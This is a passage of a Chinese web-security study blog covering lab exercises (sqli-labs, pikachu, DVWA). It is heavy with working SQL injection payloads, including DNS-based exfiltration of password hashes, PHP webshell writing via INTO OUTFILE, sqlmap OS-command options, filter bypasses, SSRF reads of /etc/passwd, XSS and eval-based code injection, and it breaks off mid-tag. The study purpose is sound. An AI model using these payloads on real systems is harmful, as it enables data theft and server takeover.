union select 1,2,count(*) from information_schema.tables where table_schema=database() group by concat(floor(rand(0)*2),0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1))+--+</code></pre><p>表名：l利用burp来实现高效率爆破：emails、referers、uagents、users</p><pre><code>-1&#39; union select 1,2,count(*) from information_schema.tables where table_schema=database() group by concat(floor(rand(0)*2),0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1))+--+</code></pre><p>列名：利用burp来实现高效率爆破：id,username,password,level,id,username,password </p><p>爆破字段值：</p><pre><code>-1&#39; union select 1,2,count(*) from users group by concat(0x7e,floor(rand(0)*2),(select concat(0x7e,password) from users limit 0,1))+--+</code></pre><p>注意，此处的floor函数前面需要有</p><h5 id="第二种报错注入xpath语法错误："><a href="#第二种报错注入xpath语法错误：" class="headerlink" title="第二种报错注入xpath语法错误："></a>第二种报错注入xpath语法错误：</h5><p>less-5：</p><pre><code>-1&#39; and updatexml(1,concat(0x7e,databse()),1) --+</code></pre><p>库名：security</p><pre><code>-1&#39; and updatexml(1,concat(0x7e,(select+table_name+from+information_schema.tables+where+table_schema=database() limit 0,1)),1) --+</code></pre><p>表明：emails、referers、uagents、users</p><pre><code>-1&#39; and updatexml(1,concat(0x7e,(select+group_concat(table_name)+from+information_schema.tables+where+table_schema=database())),1) --+</code></pre><p>列名：</p><pre><code>-1&#39; and updatexml(1,concat(0x7e,(select+column_name+from+information_schema.columns+where+table_name=&#39;users&#39; limit 0,1)),1)+--+</code></pre><p>结合burp来实现高效率爆破列名</p><pre><code>-1&#39; and updatexml(1,concat(0x7e,(select+username+from+users+limit 0,1)),1)+--+</code></pre><pre><code>-1&#39; and updatexml(1,concat(0x7e,(select+password+from+users+limit 0,1)),1)+--+</code></pre><p>结合burp实现高效率爆破 </p><h4 id="布尔注入："><a href="#布尔注入：" class="headerlink" title="布尔注入："></a>布尔注入：</h4><p>数据不能回显到前端，需要别的方式来进行判断</p><h5 id="less-8："><a href="#less-8：" class="headerlink" title="less-8："></a>less-8：</h5><p>利用length()函数来判断库名的长度</p><pre><code>1&#39;+and+length(database())&gt;1+--+</code></pre><p>集合burp半自动化来实现高效率爆破</p><p>利用substr()函数来猜解库名 </p><pre><code>1&#39;+and+substr(database(),1,1)=&#39;a&#39;+--+</code></pre><p>利用半自动化针对1和a的位置进行递增式爆破</p><p>猜表名：</p><pre><code>1&#39;+and+substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1)=&#39;a&#39;+--+</code></pre><p>对0处设置变量是因为要读第几个表，对第二个1设置变量是因为要选取第几位的第一个字母，对a就不用说了</p><p>猜列名：</p><pre><code>1&#39;+and+substr((select+column_name+from+information_schema.columns+where+table_schema=database()+and+table_name=&#39;users&#39;+limit+0,1),1,1)=&#39;a&#39;+--+</code></pre><p>同理得，当然不一定要 三个变量，可以半半自动化来实现清晰的爆破</p><pre><code>1&#39;+and+substr((select+password+from+users+limit 0,1),1,1)=&#39;a&#39;+--+</code></pre><h4 id="时间盲注-也属于布尔盲注-："><a href="#时间盲注-也属于布尔盲注-：" class="headerlink" title="时间盲注(也属于布尔盲注)："></a>时间盲注(也属于布尔盲注)：</h4><p>原理：用条件语句查看时间延迟语句是否执行</p><p>思路：</p><pre><code>1&#39;+and+if((substr(user(),1,1)=&#39;a&#39;),sleep(2),1)+--+</code></pre><p>结尾的1是返回的值，user()处可以替换为查询的语句</p><pre><code>1&#39;+and+if((substr((select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1)&gt;&#39;a&#39;),sleep(2),1)+--+</code></pre><pre><code>1&#39;+and+if((substr((select+column_name+from+information_schema.columns+where+table_name=&#39;users&#39;+limit+0,1),1,1)&gt;&#39;a&#39;),sleep(2),1)+--+</code></pre><pre><code>1&#39;+and+if((substr((select+password+from+users+limit+0,1),1,1)&gt;&#39;a&#39;),sleep(2),1)+--+</code></pre><p>OK</p><h4 id="DNSlog外带注入："><a href="#DNSlog外带注入：" class="headerlink" title="DNSlog外带注入："></a>DNSlog外带注入：</h4><p>原理：将dnslog平台中的特有字段payload带入目标发起dns请求，通过dns解析将请求后的关键信息组合成新的三级域名带出，在dns服务器的dns日志中显示出来。</p><p><strong>show variables like ‘%secure%’;查看load_file()可以读取的磁盘：</strong></p><p>当secure_file_priv为空，就可以读取磁盘的目录。</p><p>当secure_file_priv为G:\，就可以读取G盘的目录。</p><p>当secure_file_priv为null，则不能加载文件。</p><p>需要配置mysql.ini中的secure_file_priv=’ ‘</p><p>在mysql命令执行：</p><pre><code>select load_file(&#39;\\\\&#39;,afanti.xxxx.ceye.io\\aaa&#39;);其中afanti就是要注入的查询语句</code></pre><h5 id="less-9："><a href="#less-9：" class="headerlink" title="less-9："></a>less-9：</h5><p>利用dnslog.cn平台来进行测验</p><pre><code>1&#39; and (select load_file(concat(&#39;\\\\&#39;,(select+hex(password)+from+users+limit+0,1),&#39;.xxxx.dnslog.cn\\aaa&#39;)))+--+</code></pre><p>联合查询：</p><pre><code>&#39; union select 1,2,(load_file(concat(&#39;\\\\&#39;,(select+hex(password)))+from+users+limit+0,1),&#39;.xxxx.dnslog.cn\\aaa&#39;)))+--+</code></pre><p>此处需要用hex编码，以防报错</p><h4 id="POST注入："><a href="#POST注入：" class="headerlink" title="POST注入："></a>POST注入：</h4><h5 id="sqllabs-11："><a href="#sqllabs-11：" class="headerlink" title="sqllabs-11："></a>sqllabs-11：</h5><p>可以使用万能密码：</p><pre><code>&#39; or 1=1#</code></pre><p>针对登录框进行注入</p><p>post参数：</p><pre><code>uname=&#39; or 1=1#&amp;passwd=123&amp;submit=Submit</code></pre><p>主要思路就是将passwd以及其后面的内容全部注释掉，然后向get注入一样的思路就ok了</p><p>关于注册页面的账户和密码的post注入：</p><p>sql语句：</p><pre><code>$sql= &quot;insert into users values(&#39;$uname&#39;,&#39;$passwd&#39;)&quot;;</code></pre><pre><code>$uname=1&#39;or undataxml(1,user(),1) or&#39;</code></pre><p>将它放入sql中的$uname中即可发现奥妙</p><h4 id="Referer注入："><a href="#Referer注入：" class="headerlink" title="Referer注入："></a>Referer注入：</h4><h5 id="HTTP头注入："><a href="#HTTP头注入：" class="headerlink" title="HTTP头注入："></a>HTTP头注入：</h5><h6 id="COOKIE型注入："><a href="#COOKIE型注入：" class="headerlink" title="COOKIE型注入："></a>COOKIE型注入：</h6><h6 id="XFF注入："><a href="#XFF注入：" class="headerlink" title="XFF注入："></a>XFF注入：</h6><h6 id="Clien-IP："><a href="#Clien-IP：" class="headerlink" title="Clien-IP："></a>Clien-IP：</h6><h6 id="user-agent注入："><a href="#user-agent注入：" class="headerlink" title="user-agent注入："></a>user-agent注入：</h6><h6 id="referer注入："><a href="#referer注入：" class="headerlink" title="referer注入："></a>referer注入：</h6><p>less-19中存在referer注入，他提交表单依然采用的是post方式提交，但是插入sql语句的位置是在referer的处进行插入</p><pre><code>&#39;or +任意sql注入语句（报错注入，联合查询等等）</code></pre><h4 id="其他注入（delect）："><a href="#其他注入（delect）：" class="headerlink" title="其他注入（delect）："></a>其他注入（delect）：</h4><p>pikachu有靶场</p><p>sql语句中的原理：</p><pre><code>delect from 表明 where id=xxx</code></pre><p>get传参+报错注入</p><h4 id="sql注入读写文件："><a href="#sql注入读写文件：" class="headerlink" title="sql注入读写文件："></a>sql注入读写文件：</h4><p>利用的是into outfile语句</p><p>less-1做演示：</p><p>当权限为<strong>root</strong>且知道<strong>绝对路径</strong>时，可以直接写一句话木马到服务器，注意存在</p><pre><code>&#39;union select 1,2,&quot;&lt;?php eval($_POST[&#39;666&#39;]);?&gt;&quot;,into outfile &quot;E:\\phpstudy\\PHPTutorial\\WWW\\shell.php&quot;+--+</code></pre><p>然后利用蚁剑</p><p>利用load_file读取文件：</p><pre><code>&#39;union select 1,2,@@basedir+--+</code></pre><p>该参数指定了安装 MySQL 的安装路径，填写全路径可以解决相对路径所造成的问题。</p><pre><code>&#39;union select 1,2,@@dataedir+--+</code></pre><p>该参数指定了 MySQL 的数据库文件放在什么路径下。数据库文件即我们常说的 MySQL data 文件。</p><pre><code>&#39;union select 1,2,hex(load_file(&#39;E:\\phpstudy\\PHPTutorial\\WWW\\index.php&#39;))</code></pre><ul><li><h3 id="sql注入绕过与防御"><a href="#sql注入绕过与防御" class="headerlink" title="sql注入绕过与防御"></a>sql注入绕过与防御</h3></li></ul><h4 id="常见的绕过思路："><a href="#常见的绕过思路：" class="headerlink" title="常见的绕过思路："></a>常见的绕过思路：</h4><p>等价替换、双写绕过、大小写绕过、URL、16进制等编码绕过、内联注释绕过</p><p>绕过单引号过滤：使用16进制编码、或宽字节方式</p><p>绕过order by过滤：union select 1,2,3</p><p>绕过union select过滤：union distinct select</p><p>绕过=号过滤：lik、rlike替换</p><p>绕过select后的空格过滤：可以使用单引号将select后面参数包裹</p><pre><code>union distinct select&#39;1&#39;,2,3;union distinct (select&#39;1&#39;,2,3);</code></pre><p>绕过from+空格过滤：from{x 表名}</p><p>绕过大于小于：使用in、between a and b(范围在a-b之间)</p><pre><code>1 and substr(user(),1,1) in (&#39;a&#39;);select * from users where id between 1 and 2; </code></pre><p>绕过逗号过滤：join、from pos for len(代表从pos个开始读取len长度的子串) 绕过</p><pre><code>union select * from (select 1)a join(select 2)b join(select 3)c join(select 4)d</code></pre><p>等价于</p><pre><code>union select 1,2,3,4 from pos for len</code></pre><p>(代表从pos个开始读取len长度的子串)</p><p>绕过limit中的逗号过滤：使用offset关键字，limit2,1等价于limit 1offset 2, offsetx 是偏移x个数据</p><p>绕过sleep函数过滤：benchmark()函数替换，benchmark函数可以测试某些操作的执行速度，参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式benchmark(1000000000000，1)</p><p>绕过group_concat的过滤：concat_ws代替</p><h4 id="less-23：过滤了注释符"><a href="#less-23：过滤了注释符" class="headerlink" title="less-23：过滤了注释符"></a>less-23：过滤了注释符</h4><p>联合查询和报错注入实现语句拼接来进行破解</p><pre><code>1&#39;union select 1,2,3&#39;</code></pre><p>主要就是利用了闭合单引号，使查询语句不作为字符串出现</p><h4 id="less-25：针对and和or进行了过滤"><a href="#less-25：针对and和or进行了过滤" class="headerlink" title="less-25：针对and和or进行了过滤"></a>less-25：针对and和or进行了过滤</h4><p>采用双写大小写绕过</p><p>采用等价替换的方式：&amp;&amp;、||、|(异或)</p><p>采用联合查询来拼接语句，通过闭合单引号来实现</p><pre><code>-1&#39;union select 1,user(),3&#39;</code></pre><h4 id="less-26：过滤空格"><a href="#less-26：过滤空格" class="headerlink" title="less-26：过滤空格"></a>less-26：过滤空格</h4><p>等价替换：</p><p>%09 TAB键(水平)</p><p>%0a  新建一行，回车</p><p>%0b TAB键(垂直)</p><p>%0c 新的一页</p><p>%0d return功能</p><p>%a0 空格</p><p>%00 空字节</p><p>/**/ 注释代替空格</p><p>/!**/ 内联注释</p><p>()      包裹参数</p><p>``    反引号包裹参数 </p><h4 id="less-27：过滤了union和select"><a href="#less-27：过滤了union和select" class="headerlink" title="less-27：过滤了union和select"></a>less-27：过滤了union和select</h4><p>采用双写、大小写绕过</p><h4 id="防御思路："><a href="#防御思路：" class="headerlink" title="防御思路："></a>防御思路：</h4><h5 id="代码层防御："><a href="#代码层防御：" class="headerlink" title="代码层防御："></a>代码层防御：</h5><p>黑名单：不允许xxx进入</p><p>白名单：只允许xxx进入</p><p>字符过滤</p><p>规范输出</p><h5 id="配置层："><a href="#配置层：" class="headerlink" title="配置层："></a>配置层：</h5><p>开启gpc</p><p>使用utf-8</p><h5 id="物理层："><a href="#物理层：" class="headerlink" title="物理层："></a>物理层：</h5><p>waf(软/硬waf)</p><p>云防护(数据清理)</p><p>ips(入侵防御系统)</p><ul><li><h3 id="burp讲解"><a href="#burp讲解" class="headerlink" title="burp讲解"></a>burp讲解</h3></li><li><h3 id="sql注入之sqlmap"><a href="#sql注入之sqlmap" class="headerlink" title="sql注入之sqlmap"></a>sql注入之sqlmap</h3></li></ul><p>基于python2的环境下：<a href="https://blog.csdn.net/destinymf/article/details/80656996?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&dist_request_id=1328740.12990.16168352186468463&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control" target="_blank" rel="noopener">Python双环境安装</a></p><p>Python2.7.16和3.7.0</p><p><a href="https://blog.csdn.net/qq_33530840/article/details/82144515" target="_blank" rel="noopener">sqlmap使用教程</a>：</p><p><a href="https://blog.csdn.net/smli_ng/article/details/106026901" target="_blank" rel="noopener">sqlmap详细使用教程</a></p><h4 id="注入判断："><a href="#注入判断：" class="headerlink" title="注入判断："></a>注入判断：</h4><p>sqlmap.py -u url判断其php版本，服务系统</p><p>sqlmap.py -r [文本的路径]可以将burp抓到的包中的内容编辑到此文本中</p><h4 id="基本使用："><a href="#基本使用：" class="headerlink" title="基本使用："></a>基本使用：</h4><p>查询当前站点的数据库：</p><p><strong>sqlmap.py -u url –current-db</strong></p><p>查询当前用户下的所有数据库：</p><p><strong>sqlmap.py -u url –db</strong></p><p>查询数据库中的表明：</p><p><strong>sqlmap.py -u url -D dbname –tables</strong></p><p>查询表中的字段名：</p><p><strong>sqlmap.py -u url -D dbname -T tablename –culumns</strong></p><p>查询表中的字段内容：</p><p><strong>sqlmap.py -u url -D dbname -T tablename -C columnname –dump</strong></p><p>查询数据库的所有用户(当前用户有读权限)：</p><p><strong>sqlmap.py -u url –users</strong></p><p>查询数据库用户的密码：</p><p><strong>sqlmap.py -u url –password</strong></p><p>当前数据库用户名称：</p><p><strong>sqlmap.py -u url –current-users</strong></p><p>指定数据库类型：</p><p><strong>sqlmap.py -u url –dbms=mysql/oracle/mssql</strong></p><h4 id="进阶使用："><a href="#进阶使用：" class="headerlink" title="进阶使用："></a>进阶使用：</h4><p>–level1:get post</p><p>–level2:增加cookie</p><p>–level3:增加user-agent/referer</p><p>–level4:更多的payload</p><p>–level5:最高等级，包含所有的payload，会尝试自动破解出cookie，xff等头部注入。</p><h5 id="显示调试信息："><a href="#显示调试信息：" class="headerlink" title="显示调试信息："></a>显示调试信息：</h5><p>-v的7个级别：</p><p> 0：只显示python错误以及重要信息</p><p>1：显示信息以及警告</p><p>2：显示debug消息</p><p>3：显示注入payload</p><p>4：显示http请求</p><p>5：显示http响应头·</p><p>6：显示http响应内容</p><h5 id="判断用户是否为管理员："><a href="#判断用户是否为管理员：" class="headerlink" title="判断用户是否为管理员："></a>判断用户是否为管理员：</h5><p>–is-dba:返回true时为root，否则返回false</p><p>–roles               枚举DBMS用户的角色，看权限，-U可进行指定，但是仅适用于当前数据库是Oracle的时候</p><h5 id="伪造referer头："><a href="#伪造referer头：" class="headerlink" title="伪造referer头："></a>伪造referer头：</h5><p>–referer：当等级级别在3或3以上时，会尝试referer注入，可以使用–referer来伪造referer来源</p><p><strong>执行自定义的sql语句：</strong></p><p>–sql-shell：执行自定义sql语句</p><p><strong>运行系统命令(非交互式)：</strong></p><p>–os-cmd=命令：执行系统命令</p><p>这里有个前提，需要是root用户，必须知道绝对路径，且非交互式。</p><p>上传文件到数据库服务器中(root)：</p><p><strong>sqlmap.py -u url –file-write=本地文件路径 –file-dest 网站路径(写入路径)+”/写入的文件名”</strong></p><p><a href="https://blog.csdn.net/qq_34335450/article/details/106733489" target="_blank" rel="noopener">sql注入风险最简单修复方法</a></p><p>最好的还是装一waf</p><ul><li><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3></li></ul><h4 id="基于b-s架构的暴力破解："><a href="#基于b-s架构的暴力破解：" class="headerlink" title="基于b/s架构的暴力破解："></a>基于b/s架构的暴力破解：</h4><h5 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h5><p>登录框(用户名和密码)</p><p>URL参数(用户ID值、目录名、参数名等)</p><p>验证码(验证码接收处)</p><h5 id="弱口令："><a href="#弱口令：" class="headerlink" title="弱口令："></a>弱口令：</h5><h5 id="爆破点："><a href="#爆破点：" class="headerlink" title="爆破点："></a>爆破点：</h5><p>网站根目录下找后台管理地址</p><p>旁站</p><p>使用二级域名</p><p>其他服务器</p><h5 id="后台查找方法："><a href="#后台查找方法：" class="headerlink" title="后台查找方法："></a>后台查找方法：</h5><h6 id="在当前网站："><a href="#在当前网站：" class="headerlink" title="在当前网站："></a>在当前网站：</h6><p>字典暴力破解：<a href="https://blog.csdn.net/u012804180/article/details/51932863" target="_blank" rel="noopener">asp、aspx、php、jsp万能密码大全</a></p><p>爬行</p><p>谷歌 hack</p><p>网站资源利用(robots.txt、图片链接地址等)</p><p>通用cms特性</p><p>信息泄露(SVN、git等)</p><h6 id="不在当前网站："><a href="#不在当前网站：" class="headerlink" title="不在当前网站："></a>不在当前网站：</h6><p>二级域名-子域名暴力破解</p><p>端口：nmap扫描</p><p>c段扫描</p><h4 id="基于c-s架构的暴力破解："><a href="#基于c-s架构的暴力破解：" class="headerlink" title="基于c/s架构的暴力破解："></a>基于c/s架构的暴力破解：</h4><h5 id="分类：-1"><a href="#分类：-1" class="headerlink" title="分类："></a>分类：</h5><p>Windows远程桌面</p><p>ssh远程桌面</p><p>数据库账号密码</p><p>ftp账号密码</p><h5 id="流程："><a href="#流程：" class="headerlink" title="流程："></a>流程：</h5><p>确定攻击目标，需要账号密码输入的地方</p><p>建立socket通信(多线程)</p><p>输入账号(一般为默认账号)</p><p>通过字典或规则生成待测试的密码</p><p>发送面膜，取得验证</p><p>拒绝密码，重复第四部，知道密码正确</p><h5 id="爆破利器："><a href="#爆破利器：" class="headerlink" title="爆破利器："></a>爆破利器：</h5><p><a href="https://blog.csdn.net/smli_ng/article/details/106089614" target="_blank" rel="noopener">hydra(海德拉)</a></p><p>其几乎能爆破近乎所有的协议</p><p>超级弱口令检查工具</p><h4 id="生成字典："><a href="#生成字典：" class="headerlink" title="生成字典："></a>生成字典：</h4><h5 id="Windows下字典生成工具："><a href="#Windows下字典生成工具：" class="headerlink" title="Windows下字典生成工具："></a>Windows下字典生成工具：</h5><p>易优、品轩</p><h5 id="Linux下字典生成工具："><a href="#Linux下字典生成工具：" class="headerlink" title="Linux下字典生成工具："></a>Linux下字典生成工具：</h5><p><a href="https://blog.csdn.net/tb_youth/article/details/103264234" target="_blank" rel="noopener">crunch</a>、cewl、cupp</p><ul><li><h3 id="csrf漏洞"><a href="#csrf漏洞" class="headerlink" title="csrf漏洞"></a>csrf漏洞</h3></li></ul><p>跨站请求伪造，是一种挟制用户在当前已经登录的的web应用程序上执行非本意的操作的攻击方法，跟xss相比，xss利用的是用户对指定网站的信任，csrf利用的是网站对用户页面浏览器的信任。最大的去呗就是csrf没有盗取用户的cookie，而是直接的利用的浏览器储存cookie让用去执行某个动作。</p><h4 id="pikachu靶场："><a href="#pikachu靶场：" class="headerlink" title="pikachu靶场："></a>pikachu靶场：</h4><h5 id="get型："><a href="#get型：" class="headerlink" title="get型："></a>get型：</h5><p>利用两个浏览器，在搜狗将一个账号在提交时，所在URL栏要利用的信息，复制到火狐浏览器的URL中，就可以实现修改点击此链接的用户信息</p><h5 id="post型："><a href="#post型：" class="headerlink" title="post型："></a>post型：</h5><p>通过搜狗浏览器抓包生成poc用编辑器生成html文件，将打开方式设置为火狐的打开方式，打开后点击请求即可实现</p><h5 id="csrf漏洞利用条件："><a href="#csrf漏洞利用条件：" class="headerlink" title="csrf漏洞利用条件："></a>csrf漏洞利用条件：</h5><p>被害用户已经完成身份认证</p><p>新请求的提交不需要重新身份认证或确认机制</p><p>攻击者必须了解web app 请求的参数构造</p><p>诱使用户触发攻击的指令(社工)</p><h5 id="挖掘方法："><a href="#挖掘方法：" class="headerlink" title="挖掘方法："></a>挖掘方法：</h5><p>密码修改处、点赞、转账、注销、删除，有交互个数据传输的地方就可能存在csrf，但是挖掘是最好通过判断有无二次验证或者通过有无token等来快速判断</p><h5 id="修复方法："><a href="#修复方法：" class="headerlink" title="修复方法："></a>修复方法：</h5><p>进行一个重新身份验证</p><ul><li><h3 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a><a href="https://xz.aliyun.com/t/2115" target="_blank" rel="noopener">SSRF漏洞</a></h3></li></ul><p><a href="https://www.ajsafe.com/news/181.html" target="_blank" rel="noopener">SSRF——漏洞利用</a></p><h4 id="什么是ssrf？"><a href="#什么是ssrf？" class="headerlink" title="什么是ssrf？"></a>什么是ssrf？</h4><p>服务器端请求伪造，是一中由攻击者构造形成由服务端发起的请求的一个安全漏洞。一般情况下，ssrf是针对目标网站的内部系统。因为他是从内部系统访问的，所有可以通富哦它攻击外网无法访问的内部系统，也就是把目标网站当中间人。</p><h4 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>ssrf形成的原因大都是由于服务端提供从其他服务器萤火获取的数据的功能，且没有对目标地址做过滤与限制。比如从指定的URL地址获取网页文本内容，加载指定地址的图片，文档，等。</p><h4 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h4><p>内外网的端口和服务扫描</p><p>主机本地免肝数据的读取</p><p>内外网主机应用程序漏洞的利用</p><p>内外网web站点漏洞的利用</p><h4 id="漏洞危害："><a href="#漏洞危害：" class="headerlink" title="漏洞危害："></a>漏洞危害：</h4><p>探测内网服务以及内网拓扑</p><p>向内部任意主机的任意端口发送精心构造的payload</p><p>dos冬季</p><p>攻击内网的web应用，如xss、sql注入等</p><p>利用file、dict、gopher等协议读取文本信息</p><h4 id="常用协议："><a href="#常用协议：" class="headerlink" title="常用协议："></a>常用协议：</h4><p>file协议可用于查看文件</p><p>dict可用于刺探端口</p><p>gopher协议支持get/post等请求，可用于攻击内网ftp、redis、telnet、smtp等服务</p><h4 id="file协议-本地文件传输协议-的运用："><a href="#file协议-本地文件传输协议-的运用：" class="headerlink" title="file协议(本地文件传输协议)的运用："></a>file协议(本地文件传输协议)的运用：</h4><pre><code>?url=file:///etc/passwd</code></pre><h4 id="gopher协议运用："><a href="#gopher协议运用：" class="headerlink" title="gopher协议运用："></a>gopher协议运用：</h4><pre><code>?url=gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;</code></pre><p><a href="https://blog.csdn.net/qq_41107295/article/details/103026470" target="_blank" rel="noopener">SSRF利用 Gopher 协议拓展攻击面</a></p><h4 id="dict协议应用："><a href="#dict协议应用：" class="headerlink" title="dict协议应用："></a><a href="https://blog.csdn.net/weixin_35678674/article/details/114470729" target="_blank" rel="noopener">dict协议应用：</a></h4><pre><code>?url=dict://serverip:port/命令:参数</code></pre><p>可以针对端口处，设置参数，利用常用端口的字典来进行爆破端口查看</p><h4 id="pikachu靶场练习："><a href="#pikachu靶场练习：" class="headerlink" title="pikachu靶场练习："></a>pikachu靶场练习：</h4><p><strong>PHP中下面函数的使用不当会导致SSRF:</strong><br><strong>file_get_contents()</strong><br><strong>fsockopen()</strong><br><strong>curl_exec()</strong></p><p>知识补充：<a href="https://blog.csdn.net/deliciousion/article/details/78062521" target="_blank" rel="noopener">强大的curl命令的介绍和一般用法</a></p><pre><code>?url=file:///E:\phpstudy\PHPTutorial\WWW\pikachu-master/123.txt</code></pre><p>利用file://来读取123.txt的内容</p><pre><code>?url=dict://127.0.0.1:3306</code></pre><p>来读取本地3306端口的信息</p><h4 id="漏洞挖掘："><a href="#漏洞挖掘：" class="headerlink" title="漏洞挖掘："></a><a href="https://blog.csdn.net/u010726042/article/details/77806775" target="_blank" rel="noopener">漏洞挖掘：</a></h4><p>分享：通过URL地址分享网页内容</p><p>转码服务</p><p>在线翻译</p><p>图片的加载与下载：通过URL地址加载或下载图片</p><p>图片、文章收藏功能</p><p>未公开的api实现以及其他调用URL的功能</p><p>从URL关键字中寻找</p><h4 id="修复方法：-1"><a href="#修复方法：-1" class="headerlink" title="修复方法："></a>修复方法：</h4><p>禁用不需要的协议</p><p>黑名单内网ip</p><p>限制请求的端口为HTTP常用的端口：80、443、8080、8090</p><p>过滤返回信息</p><p>统一错误信息</p><ul><li><h3 id="URL跳转"><a href="#URL跳转" class="headerlink" title="URL跳转"></a><a href="https://blog.csdn.net/pro20/article/details/105731095" target="_blank" rel="noopener">URL跳转</a></h3></li></ul><p>指后台服务器在告知浏览器跳转时，未对客户端传入的重定向地址进行合法性校验，导致用户浏览器跳转到钓鱼页面的一中漏洞</p><h4 id="跳转实现方式"><a href="#跳转实现方式" class="headerlink" title="跳转实现方式"></a><strong>跳转实现方式</strong></h4><pre><code>1.META标签内跳转2.javascript跳转3.header跳转</code></pre><h5 id="meta："><a href="#meta：" class="headerlink" title="meta："></a>meta：</h5><pre><code>&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;5; url=&lt;?php echo $url?&gt;&quot; /&gt;</code></pre><h5 id="js跳转源码："><a href="#js跳转源码：" class="headerlink" title="js跳转源码："></a>js跳转源码：</h5><h5 id="header跳转源码："><a href="#header跳转源码：" class="headerlink" title="header跳转源码："></a>header跳转源码：</h5><pre><code>header(&quot;Location:$url&quot;)</code></pre><h4 id="漏洞危害：-1"><a href="#漏洞危害：-1" class="headerlink" title="漏洞危害："></a>漏洞危害：</h4><p>钓鱼：利用源码小偷制作钓鱼网站</p><p>配合csrf</p><p>配合xss漏洞</p><h4 id="pikachu靶场练习：-1"><a href="#pikachu靶场练习：-1" class="headerlink" title="pikachu靶场练习："></a>pikachu靶场练习：</h4><p>还得是自主学习！</p><ul><li><h3 id="xss漏洞"><a href="#xss漏洞" class="headerlink" title="xss漏洞"></a>xss漏洞</h3></li></ul><p><a href="https://blog.csdn.net/weixin_42277564/article/details/100140894" target="_blank" rel="noopener">XSS语句</a></p><p><a href="https://blog.csdn.net/weixin_30845171/article/details/98501929" target="_blank" rel="noopener">XSS 漏洞原理及防御方法</a></p><h4 id="↓↓↓↓搭建dvwa并演练↓↓↓↓"><a href="#↓↓↓↓搭建dvwa并演练↓↓↓↓" class="headerlink" title="↓↓↓↓搭建dvwa并演练↓↓↓↓"></a>↓↓↓↓搭建dvwa并演练↓↓↓↓</h4><h4 id="反射型："><a href="#反射型：" class="headerlink" title="反射型："></a>反射型：</h4><p>low：</p><pre><code>&lt;img src=x onerror=alert(1);&gt;</code></pre><h4 id="存储型："><a href="#存储型：" class="headerlink" title="存储型："></a>存储型：</h4><p>low：没意思</p><h4 id="Dom型："><a href="#Dom型：" class="headerlink" title="Dom型："></a>Dom型：</h4><p>在URL栏后面注入一个标签</p><h4 id="XSS进阶利用："><a href="#XSS进阶利用：" class="headerlink" title="XSS进阶利用："></a>XSS进阶利用：</h4><p><strong>BeFF原理：</strong>zombie（僵尸）即受害的浏览器。zombie是被hook（勾连）的，如果浏览器访问了有勾子（由js编写）的页面，就会被hook，勾连的浏览器会执行初始代码返回一些信息，接着zombie会每隔一段时间（默认为1秒）就会向BeEF服务器发送一个请求，询问是否有新的代码需要执行。BeEF服务器本质上就像一个Web应用，被分为前端UI，    和后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示， BeEF持有者可以通过浏览器来登录BeEF  的后台管理UI。</p><p><a href="https://www.freebuf.com/articles/web/175755.html" target="_blank" rel="noopener"><strong>BeFF默认设置未同metasploit关联，无法使用msf模块，因此需要配置来连接msf</strong></a></p><p>这个服务极其NB！！！</p><p><a href="https://www.pianshen.com/article/42831378513/" target="_blank" rel="noopener">BeEF-XSS详细使用教程</a></p><h4 id="漏洞挖掘：-1"><a href="#漏洞挖掘：-1" class="headerlink" title="漏洞挖掘："></a>漏洞挖掘：</h4><p>见框就插：</p><p>搜索框、URL地址栏、留言板、登陆处、各种有输入输出点的地方</p><h4 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h4><p>白名单</p><p>输出检查</p><p>HTTPonly：浏览器进制页面的javascript访问带哦有HTTPonly属性的cookie。HTTPonly解决的是xss后的cookie劫持攻击</p><ul><li><h3 id="代码注入与命令注入"><a href="#代码注入与命令注入" class="headerlink" title="代码注入与命令注入"></a>代码注入与命令注入</h3></li></ul><h4 id="代码执行漏洞以及利用"><a href="#代码执行漏洞以及利用" class="headerlink" title="代码执行漏洞以及利用"></a>代码执行漏洞以及利用</h4><p><a href="https://www.jianshu.com/p/4aa5c0448e30" target="_blank" rel="noopener">代码执行漏洞相关函数</a></p><h5 id="静态函数执行："><a href="#静态函数执行：" class="headerlink" title="静态函数执行："></a>静态函数执行：</h5><p><a href="https://www.runoob.com/php/func-misc-eval.html" target="_blank" rel="noopener">eval()函数</a>把字符串当成 PHP 代码来计算</p><p><a href="https://www.runoob.com/w3cnote/c-assert.html" target="_blank" rel="noopener">assert()函数</a>会定期检查指定的断言并在结果为false时采取适当的行动</p><p>assert(‘phpinfo();’);</p><p>eval(‘phpinfo();’);</p><h5 id="动态函数执行："><a href="#动态函数执行：" class="headerlink" title="动态函数执行："></a>动态函数执行：</h5><pre><code>&lt;?php$name=$_GET[&#39;666&#39;];eval($name.&#39;;&#39;);</code></pre><h5 id="利用方式："><a href="#利用方式：" class="headerlink" title="利用方式："></a>利用方式：</h5><ul><li>获取绝对路径：</li></ul><pre><code>__FILE__是php预定义的常量，可以用来过去当前文件的绝对路径，?code=print(__FILE__)</code></pre><ul><li>文件读取：</li></ul><p>file_get_contents()函数用来读取服务器文件，？code=var_dump(file_get_contents(‘$_POST[‘filename]’,’$_POST[code]’));</p><ul><li>写入一句话木马：</li></ul><p>用file_get_contents()函数写入一句话木马前提是必须知道路径，？code=file_put_contents(‘c:\windows\win.ini’);</p><p>然后借助hackbar去提交filename=shell.php&amp;code=<?php eval($_POST['x'];?>借口在当前目录生成一句话木马。</p><h5 id="修复建议："><a 